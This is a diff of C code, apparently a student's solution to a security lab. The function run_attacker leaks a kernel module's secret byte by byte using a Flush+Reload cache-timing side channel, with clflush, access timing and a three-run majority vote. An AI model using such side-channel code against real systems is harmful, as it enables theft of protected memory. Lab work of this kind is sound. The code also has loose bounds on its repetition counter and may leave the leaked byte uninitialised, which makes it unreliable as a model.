@@ -40,17 +40,57 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[LAB2_SECRET_MAX_LEN];
     size_t current_offset = 0;
+    int access_time;
+    char leaked_byte_array[5];
 
     printf("Launching attacker\n");
 
-    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte;
 
+    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
+    //for (current_offset = 0; current_offset < 1; current_offset++) {
+        char leaked_byte;
+        int found[3] = {0, 0, 0};
         // [Part 1]- Fill this in!
         // Feel free to create helper methods as necessary.
         // Use "call_kernel_part1" to interact with the kernel module
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
+
+    for (int rep = 0; rep < 3; ) { 
+
+       for (int pages = 0; pages < 128; pages++) {
+           clflush(shared_memory + 4096*pages);
+       }
+
+       call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+       for (int cache_line = 0; cache_line < 128; cache_line++) {
+	       access_time = time_access(shared_memory + 4096*cache_line);
+               if (access_time < 200) {
+		       
+		leaked_byte_array[rep] = (char) cache_line;
+		rep++;
+	       // printf("The time access for block %d is %d\n",cache_line, access_time); 
+	       
+	       }
+          }
+
+     }
+
+     for (int i =0; i <3; i++) {
+	  for (int j = 0; j < 3; j++) {
+             if (i != j) 
+              if (leaked_byte_array[i] == leaked_byte_array[j]) {
+	          found[i]++;
+	      }
+        }
+     }
+     for (int i =0; i < 3; i++) {
+      if (found[i] >= 2) {
+      leaked_byte = leaked_byte_array[i];
+      break; 
+      }
+     }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
